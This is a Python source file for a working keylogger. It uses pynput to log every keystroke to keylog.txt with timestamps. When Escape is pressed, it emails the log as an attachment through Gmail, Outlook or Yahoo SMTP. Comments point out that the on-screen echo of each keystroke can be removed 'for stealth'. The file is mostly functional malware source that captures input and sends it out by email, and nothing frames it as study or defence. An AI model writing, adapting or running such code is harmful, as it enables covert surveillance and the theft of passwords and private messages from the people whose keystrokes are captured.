# Import the required modules
import utils.net
import utils.clients
import utils.http_session
import utils.transport
import utils.session
from pynput import keyboard  # For monitoring keyboard
import logging              # For saving data to files
import smtplib                          # For sending emails
from email.mime.multipart import MIMEMultipart  # For creating email structure
from email.mime.text import MIMEText            # For email body text
from email.mime.base import MIMEBase            # For file attachments
from email import encoders                      # For encoding attachments
import os                                       # For file operations
import re                                       # For email validation
import getpass                                  # For secure password input

def validate_email(email):
    """Validate email address format using regex"""
    # Basic email validation pattern
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

def get_email_input(prompt):
    """Get and validate email input from user"""
    while True:
        email = input(prompt).strip()
        if validate_email(email):
            return email
        else:
            print("❌ Invalid email format! Please try again.")
            print("💡 Example: user@gmail.com")

def get_email_credentials():
    """Get email configuration from user input"""
    print("=" * 60)
    print("📧 EMAIL CONFIGURATION SETUP")
    print("=" * 60)
    
    # Get sender email
    print("🔸 SENDER EMAIL (Your email address)")
    sender_email = get_email_input("Enter your email address: ")
    
    # Get sender password securely (hidden input)
    print("\n🔸 SENDER PASSWORD")
    print("💡 For Gmail, use App Password (not regular password)")
    print("💡 Generate App Password: Google Account → Security → App passwords")
    
    while True:
        sender_password = getpass.getpass("Enter your email password (hidden): ")
        if sender_password.strip():
            break
        print("❌ Password cannot be empty! Please try again.")
    
    # Get recipient email
    print("\n🔸 RECIPIENT EMAIL (Where to send keylog)")
    recipient_email = get_email_input("Enter recipient email address: ")
    
    # Confirm details
    print("\n" + "=" * 60)
    print("📋 CONFIGURATION SUMMARY")
    print("=" * 60)
    print(f"📤 From: {sender_email}")
    print(f"📥 To: {recipient_email}")
    print(f"🔑 Password: {'*' * len(sender_password)} (hidden)")
    
    while True:
        confirm = input("\n✅ Is this configuration correct? (y/n): ").lower().strip()
        if confirm in ['y', 'yes']:
            return sender_email, sender_password, recipient_email
        elif confirm in ['n', 'no']:
            print("\n🔄 Let's set it up again...")
            return get_email_credentials()  # Restart the process
        else:
            print("❌ Please enter 'y' for yes or 'n' for no")

def send_email_with_attachment(sender_email, sender_password, recipient_email, subject, body, filename):
    """Send email with file attachment - Fixed function name"""
    
    print("\n" + "=" * 50)
    print("📧 SENDING EMAIL REPORT")
    print("=" * 50)
    
    # Creating an email sending container
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject

    print(f"📧 Preparing email from {sender_email}")
    print(f"📧 Sending to: {recipient_email}")
    print(f"📄 Subject: {subject}")
    
    # Now adding the email body text
    msg.attach(MIMEText(body, 'plain'))
    print("✅ Email body added")

    # Checking if the filename exists or not
    if not os.path.exists(filename):
        print(f"❌ Error: File {filename} not found!")
        return False
    
    print(f"📎 Attaching file: {filename}")

    # Attaching the file with email
    try:
        with open(filename, 'rb') as attachment_file:
            # Create attachment part
            attachment_part = MIMEBase('application', 'octet-stream')
            attachment_part.set_payload(attachment_file.read())
        
        # Encode the attachment in base64
        encoders.encode_base64(attachment_part)
        
        # Add header with filename
        attachment_part.add_header(
            'Content-Disposition',
            f'attachment; filename= {os.path.basename(filename)}'
        )
        
        # Attach to email message
        msg.attach(attachment_part)
        
        # Get file size for display
        file_size = os.path.getsize(filename)
        print(f"✅ File {filename} attached successfully ({file_size} bytes)")
        
    except Exception as e:
        print(f"❌ Error attaching file: {e}")
        return False

    # Now sending the file through SMTP
    try:
        # Determine SMTP server based on email domain
        domain = sender_email.split('@')[1].lower()
        if 'gmail' in domain:
            smtp_server, smtp_port = 'smtp.gmail.com', 587
        elif 'outlook' in domain or 'hotmail' in domain:
            smtp_server, smtp_port = 'smtp-mail.outlook.com', 587
        elif 'yahoo' in domain:
            smtp_server, smtp_port = 'smtp.mail.yahoo.com', 587
        else:
            smtp_server, smtp_port = 'smtp.gmail.com', 587  # Default to Gmail
        
        # Connect to SMTP server
        print(f"🌐 Connecting to {smtp_server}:{smtp_port}...")
        server = smtplib.SMTP(smtp_server, smtp_port)
        
        # Enable TLS encryption for security
        server.starttls()
        print("🔒 TLS encryption enabled")
        
        # Login to your email account
        print("🔑 Authenticating...")
        server.login(sender_email, sender_password)
        
        # Convert message to string format
        email_text = msg.as_string()
        
        # Send the email
        print("📤 Sending email...")
        server.sendmail(sender_email, recipient_email, email_text)
        
        # Close the server connection
        server.quit()
        
        print("🎉 Email sent successfully!")
        return True
        
    except smtplib.SMTPAuthenticationError:
        print("❌ Authentication failed! Check your email and password.")
        print("💡 For Gmail: Use App Password, not regular password")
        print("💡 For Outlook: Use regular password or App Password")
        return False
    except smtplib.SMTPException as e:
        print(f"❌ SMTP error: {e}")
        return False
    except Exception as e:
        print(f"❌ Failed to send email: {e}")
        return False

# Global variables to store email configuration
SENDER_EMAIL = ""
SENDER_PASSWORD = ""
RECIPIENT_EMAIL = ""

# Configure logging to save keystrokes to a file
logging.basicConfig(
    filename="keylog.txt",                    # Save to this file
    level=logging.DEBUG,                      # Log all message types
    format='%(asctime)s: %(message)s'        # Include timestamp in logs
)

def on_press(key):
    """This function runs every time a key is pressed"""
    try:
        # Try to get the character representation of the key
        character = key.char
        
        # Log the character to file
        logging.info(f'Character pressed: {character}')
        
        # Also display it on screen (optional - comment out for stealth)
        print(f'You pressed: {character}')
        
    except AttributeError:
        # This happens when the key doesn't have a character (like Ctrl, Alt, etc.)
        
        # Log the special key to file
        logging.info(f'Special key pressed: {key}')
        
        # Display it on screen (optional - comment out for stealth)
        print(f'Special key pressed: {key}')

def on_release(key):
    """This function runs every time a key is released"""
    
    # Check if the released key is the Escape key
    if key == keyboard.Key.esc:
        print("\n🛑 Escape key detected - stopping keylogger")
        
        # Log that the keylogger is stopping
        logging.info("Keylogger stopped by user")
        
        print("📧 Sending keylog file via email...")
        
        # Send the keylog file via email using global variables
        success = send_email_with_attachment(
            sender_email=SENDER_EMAIL,
            sender_password=SENDER_PASSWORD,
            recipient_email=RECIPIENT_EMAIL,
            subject="🔍 Keylogger Report - Session Complete",
            body="Hello,\n\nAttached is the keylogger report file.\n\nSession has ended.\n\nBest regards,\nKeylogger System",
            filename="keylog.txt"
        )
        
        if success:
            print("✅ Keylog file sent successfully!")
            print("📧 Check your email for the keylog report")
        else:
            print("❌ Failed to send keylog file")
            print("💾 Keylog is still saved locally as 'keylog.txt'")
        
        # Return False to stop the listener
        return False

def main():
    """Main function to run the keylogger"""
    global SENDER_EMAIL, SENDER_PASSWORD, RECIPIENT_EMAIL
    
    print("=" * 60)
    print("🔍 KEYLOGGER WITH EMAIL REPORTING")
    print("=" * 60)
    print("📝 This program will capture keystrokes and email the log")
    print("📧 First, let's set up your email configuration")
    print("=" * 60)
    
    # Get email configuration from user
    try:
        SENDER_EMAIL, SENDER_PASSWORD, RECIPIENT_EMAIL = get_email_credentials()
    except KeyboardInterrupt:
        print("\n\n👋 Setup cancelled by user. Exiting...")
        return
    
    print("\n" + "=" * 60)
    print("🚀 STARTING KEYLOGGER")
    print("=" * 60)
    print("📝 All keystrokes will be saved to 'keylog.txt'")
    print("📧 Press Escape to stop and email the log file")
    print("⚡ Keylogger is now active...")
    print("-" * 60)

    # Log session start with email info
    logging.info("=" * 50)
    logging.info("NEW KEYLOGGER SESSION STARTED")
    logging.info(f"Will send report to: {RECIPIENT_EMAIL}")
    logging.info("=" * 50)

    # Create and start the keyboard listener
    try:
        with keyboard.Listener(
            on_press=on_press,      # Function to call when key is pressed
            on_release=on_release   # Function to call when key is released
        ) as listener:
            # Start listening for keyboard events
            listener.join()
    except KeyboardInterrupt:
        print("\n\n🛑 Keylogger interrupted by user")
        logging.info("Keylogger interrupted by user")

    # This runs after the listener stops
    print("\n🏁 Keylogger session completed!")
    print("💾 Local backup: keylog.txt")

# Run the program
if __name__ == "__main__":
    main()
